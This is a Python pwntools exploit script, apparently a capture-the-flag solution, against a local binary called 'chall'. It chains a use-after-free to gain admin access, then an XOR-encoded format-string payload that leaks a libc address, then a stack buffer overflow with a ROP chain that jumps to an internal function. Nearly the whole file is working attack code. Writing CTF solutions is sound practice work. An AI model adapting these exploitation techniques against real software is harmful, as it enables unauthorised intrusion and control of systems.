from pwn import * 

context.arch="x86_64"

def login(p, username, username_length):

    p.sendlineafter("option: ", "1")
    p.sendlineafter("length: ", str(username_length))
    p.sendlineafter("username: ", username)

def logout(p):

    p.sendlineafter("option: ", "2")

def get_secret_menu(p):

    p.sendlineafter("option: ", "3")


def xor_payload(payload):

    arr = [] 

    for char in payload:

        arr.append(chr(char ^ 0xf))

    return "".join(arr)

    
def main():

    GDBSCRIPT = ''' \

        x/40gx $rbp
    '''

    NOTE_SIZE = 100
    HOST = ""
    PORT = 0

    local = True 
    elf = ELF("./chall")
    libc = ELF("./libc6_2.27-3ubuntu1.2_amd64.so")

    if local:

        p = process("./chall")

    else:

        p = remote(HOST, PORT)

    #======== STEP 1 ===========
    #getting admin access by abusing UAF bug 

    login(p, "A" * 8 + "IS_ADMIN", 16)
    logout(p)
    login(p, "A" * 8, 8)
    get_secret_menu(p)
    
    #======== STEP 2 ============
    #leaking libc address

    payload = b"%1$p|%2$p|%3$p|%4$p|"
    xored_payload = xor_payload(payload)
    p.sendlineafter("Note: ", xored_payload)
    libc_leak = p.recvuntil(b"|", drop=True)
    libc_leak = int(libc_leak, 16)
    log.info(f"Libc leak: {hex(libc_leak)}")
    
    libc_base = libc_leak - 0x3ed8d0
    libc.address = libc_base 
    log.info(f"Libc base: {hex(libc_base)}")
    p.sendlineafter("Description: ", "BB")
    #========== STEP 3 ============
    #building the rop chain

    rop = ROP(elf)
    ret = rop.find_gadget(["ret"]).address
    add_note = 0x004015d7
    
    ropchain = flat(

        b"A" * 40, 
        p64(ret),
        p64(add_note)
    )

    get_secret_menu(p)
    p.sendlineafter("Note: ", "AA")
    p.sendlineafter("Description: ", ropchain)

    data = p.recv()
    print(data)

if __name__ == "__main__":

    main()
